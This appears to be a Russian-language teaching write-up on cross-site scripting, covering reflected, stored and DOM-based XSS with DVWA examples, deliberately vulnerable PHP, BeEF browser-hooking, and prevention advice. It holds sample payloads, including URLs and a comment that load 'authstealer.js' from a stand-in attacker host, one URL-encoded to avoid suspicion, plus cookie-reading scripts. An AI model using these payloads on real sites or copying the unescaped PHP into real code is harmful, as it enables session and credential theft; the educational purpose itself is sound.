# **XSS уязвимость**

## **Описание уязвимости**
XSS (англ. Cross-Site Scripting — «межсайтовый скриптинг») — тип атаки на веб-системы, заключающийся во внедрении в выдаваемую веб-системой страницу вредоносного кода (который будет выполнен на компьютере пользователя при открытии им этой страницы) и взаимодействии этого кода с веб-сервером злоумышленника. Является разновидностью атаки «Внедрение кода».

Специфика подобных атак заключается в том, что вредоносный код может использовать авторизацию пользователя в веб-системе для получения к ней расширенного доступа или для получения авторизационных данных пользователя. Вредоносный код может быть вставлен в страницу как через уязвимость в веб-сервере, так и через уязвимость на компьютере пользователя.
XSS находится на третьем месте в рейтинге ключевых рисков Web-приложений, согласно OWASP 2021.

## **Теория**
Не существует единой стандартизированной классификации недостатков межсайтового скриптинга, но большинство экспертов различают по крайней мере две основные разновидности XSS: непостоянные(reflected) и постоянные(stored). Также выделяют DOM-based XSS.

### **Reflected XSS**
**Непостоянная (или отраженная) уязвимость межсайтового скриптинга** на сегодняшний день является самым основным типом веб-уязвимости. Эти дыры обнаруживаются, когда данные, предоставленные веб-клиентом, чаще всего в параметрах HTTP-запроса (например, отправка HTML-формы), немедленно используются серверные скрипты для анализа и отображения страницы результатов.

Отраженная атака обычно отправляется по электронной почте или на нейтральный веб-сайт. Приманка - это невинно выглядящий URL-адрес, указывающий на надежный сайт, но содержащий вектор XSS. Если доверенный сайт уязвим для XSS, нажатие на ссылку может привести к тому, что браузер жертвы запустит внедренный скрипт.

**Пример XSS**
```
http://vulnerable-website.com/search?q=<script>alert(document.cookie);</script>
```
**Пример созданной URL-ссылки для хищения информации**
```HTML
http://vulnerable-website.com/search?q=puppies<script>src="http://hackersite.com/authstealer.js"</script>
<!--(Пример закодированной ссылки для отведения подозрений-->
http://vulnerable-website.com/search?q=puppies%3Cscript%20src%3D%22http%3A%2F%2Fhackersite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E
```
### **Stored XSS**
**Хранимая уязвимость XSS** является более разрушительным вариантом ошибки межсайтового скриптинга: она возникает, когда данные, предоставленные злоумышленником, сохраняются сервером, а затем постоянно отображаются на "обычных" страницах, возвращаемых другим пользователям в ходе обычного просмотра, без надлежащего экранирования HTML. Классическим примером этого являются онлайн-доски объявлений, где пользователям разрешено размещать сообщения в формате HTML для чтения другими пользователями.

Постоянные XSS уязвимости могут быть более значительными, чем другие типы, потому что вредоносный скрипт злоумышленника отображается автоматически, без необходимости индивидуально нацеливать жертвы или заманивать их на сторонний веб-сайт. В частности, в случае сайтов социальных сетей, код будет дополнительно разработан для самораспространения между учетными записями, создавая тип клиентского червя.

Методы внедрения могут сильно различаться; в некоторых случаях злоумышленнику может даже не понадобиться напрямую взаимодействовать с самой веб-функциональностью, чтобы использовать такую дыру. Любые данные, полученные веб-приложением (по электронной почте, системным журналам, мгновенным сообщениям и т.д.), которые могут контролироваться злоумышленником, могут стать вектором внедрения.

**Пример атаки - Происходит авторизация на сайте,где злоумышленник заранее знает,что есть функция написания комментариев и производит атаку путем XSS уязвимости.**
```HTML
<!--Злоумышленник вставляет в свой комментарий JS скрипт-->
"Очень люблю щенков. Вы только взгляните на них!<img src="http://hackersite.com/authstealer.js">

```
### **DOM-based XSS**

**XSS на основе DOM (или, как его называют в некоторых текстах, «XSS типа 0»)** — это XSS-атака, при которой полезная нагрузка атаки выполняется в результате изменения «окружения» DOM в браузере жертвы, используемом исходной клиентской стороной script, чтобы код на стороне клиента работал «неожиданно». То есть сама страница (то есть ответ HTTP) не меняется, но код на стороне клиента, содержащийся на странице, выполняется по-другому из-за вредоносных модификаций, которые произошли в среде DOM.

Это отличается от других XSS-атак (хранимых или отраженных), когда полезная нагрузка атаки помещается на страницу ответа (из-за недостатка на стороне сервера).

Стратегии предотвращения XSS-атак на основе DOM включают в себя меры, очень похожие на традиционные стратегии предотвращения XSS, но реализованные в коде JavaScript и содержащиеся на веб-страницах (т.е. проверка ввода и экранирование). Некоторые фреймворки JavaScript имеют встроенные средства противодействия этому и другим типам атак — например, AngularJS.

Страница вызывается с URL-адресом, например:
```
http://www.some.site/page.html?default=French
```
Атака XSS на основе DOM на эту страницу может быть осуществлена ​​путем отправки жертве следующего URL-адреса:
```HTML
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
```

Когда жертва переходит по этой ссылке, браузер отправляет запрос
```HTML
/page.html?default=<script>alert(document.cookie)</script>
```
на www.some.site. Сервер отвечает страницей, содержащей приведенный выше код Javascript. Браузер создает объект DOM для страницы, в котором объект document.location содержит строку:
```HTML
http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
```

Исходный код Javascript на странице не ожидает, что параметр по умолчанию будет содержать HTML-разметку, поэтому он просто декодирует и отображает его на странице (DOM) во время выполнения. Затем браузер отображает результирующую страницу и выполняет сценарий злоумышленника:
```js
alert(document.cookie)
```

## Уязвимое приложение 
## Reflected XSS

Рассмотрим пример уязвимого к Reflected XSS веб приложения.
![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/reflected_example.png?raw=true)

*Источник: [DVWA](https://dvwa.co.uk/)*

Здесь результат полученного в GET запросе параметра напрямую подставляется в конструкцию на PHP, осуществляющую отрисовку "User Feedback".
```php
<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?> 
```
## Stored XSS
Рассмотрим пример уязвимого к Stored XSS Web-приложения
![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/stored_example.png?raw=true)

*Источник: [DVWA](https://dvwa.co.uk/)*

```php
<?php

if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );
    ...
    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
}

?> 
```

Здесь мы видим, что введённый пользователем комментарий попадает в базу сайта без должной фильтрации.
## Демонстрация уязвимости
## Reflected XSS
Приведём простой пример эксплуатации этой XSS уязвимости:
![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/reflected_alert.png?raw=true)

*Источник: [DVWA](https://dvwa.co.uk/)*

```html
<form name="XSS" action="#" method="GET">
			<p>
				What's your name?
				<input type="text" name="name">
				<input type="submit" value="Submit">
			</p>

</form>
<pre>
    Hello 
    <script>
        alert('1');
    </script>
</pre>
```

Таким образом, манипулируя параметром GET запроса (можно было это сделать и через URL страницы), мы внедрили JS-скрипт на страницу жертвы.

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/reflected_alert_show.png?raw=true)

## Stored XSS
Приведём пример эксплуатации такого типа XSS:

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/stored_alert.png?raw=true)

```html
<div id="guestbook_comments">Name: test<br />Message: This is a test comment.<br /></div>
<div id="guestbook_comments">Name: aaa<br />Message: test<br /></div>
<div id="guestbook_comments">Name: bbb<br />Message: <script>alert('1');</script><br /></div>
```
Таким образом, внедрив в текст комментария HTML блок `<script>`, мы внедрили JS-скрипт на веб-страницу, который будет исполнен в браузере каждого посетителя этой страницы.

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/stored_alert_show.png?raw=true)

## Автоматизация атаки
Для работы с XSS уязвимостью существует множество автоматизированных инструментов эксплуатации, среди которых следует отметить фреймворк [beef-xss](https://github.com/beefproject/beef) 

Для использования этого инструмента, нужно заставить жертву исполнить JS-скрипт (с помощью XSS), который подтянет браузер жертвы в beef-xss.

Запустив beef-xss, мы увидим какой JS-скрипт нужно внедрить на страницу жертвы:

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/beef_hook.png?raw=true)

Помещаем его в XSS атаку:

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/hook_posted.png?raw=true)
![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/hook_in_html.png?raw=true)

После чего, браузер жертвы получает с хоста атакующего hook.js и, исполняя его, попадает под контроль beef-xss:

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/dev_tool.png?raw=true)

![](https://github.com/ishanyam/SEQ-VulnList/blob/master/img/xss/hooked_browser.png?raw=true)

## Рекомендации

XSS уязвимость возникает потому, что не производится фильтрация приходящих со стороны клиента данных. Исправить это можно, используя специальные функции, заменяющие опасные конструкции в пользовательском вводе на HTML-мнемоники.

Пример для PHP:
```php
<?php

$text = "<script>alert('1')</script>"; // эту строку мы получили от пользователя
$safe_str = htmlspecialchars($text); // отфильтрованная, безопасная строка

// Получившеяся строка: &lt;script&gt;alert(&apos;1&apos;)&lt;/script&gt;
?>
```

Меньше XSS-ошибок появляется в приложениях, созданных с использованием современных веб-фреймворков. Однако, у каждого фреймворка есть как и положительные, так и отрицательные черты с точки зрения безопасноти. [Кодирование вывода и очистка HTML](https://cheatsheetseries.owaspcheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) во многих случаях смогут дать необходимую защиту фреймворку. 

В целом, эффективное предотвращение XSS-уязвимостей, вероятно, будет включать в себя сочетание следующих мер:
- **Фильтровать вход по прибытии.** В момент получения пользовательского ввода фильтруйте как можно более строго на основе ожидаемого или действительного ввода.
- **Кодировать данные на выходе.** В момент, когда управляемые пользователем данные выводятся в ответах HTTP, кодируйте выходные данные, чтобы предотвратить их интерпретацию как активное содержимое.В зависимости от контекста вывода может потребоваться применение комбинации кодирования HTML, URL, JavaScript и CSS.
- **Используйте соответствующие заголовки ответов.** Чтобы предотвратить XSS в ответах HTTP, которые не предназначены для содержания HTML или JavaScript, вы можете использовать заголовки Content-Typeи X-Content-Type-Options, чтобы браузеры интерпретировали ответы так, как вы задумали.
- **Политика безопасности контента.** В качестве последней линии защиты вы можете использовать политику безопасности контента (CSP), чтобы уменьшить серьезность любых уязвимостей XSS, которые все еще возникают.

## Ссылки
- [Cross-site scripting by PortSwigger](https://portswigger.net/web-security/cross-site-scripting)
- [Cross-site scripting (XSS) cheat sheet by PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Cross Site Scripting (XSS) by OWASP](https://owasp.org/www-community/attacks/xss/)
- [Cross Site Scripting Prevention by OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Cross-site scripting by Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting)
- [How to prevent XSS by PortSwigger](https://portswigger.net/web-security/cross-site-scripting/preventing)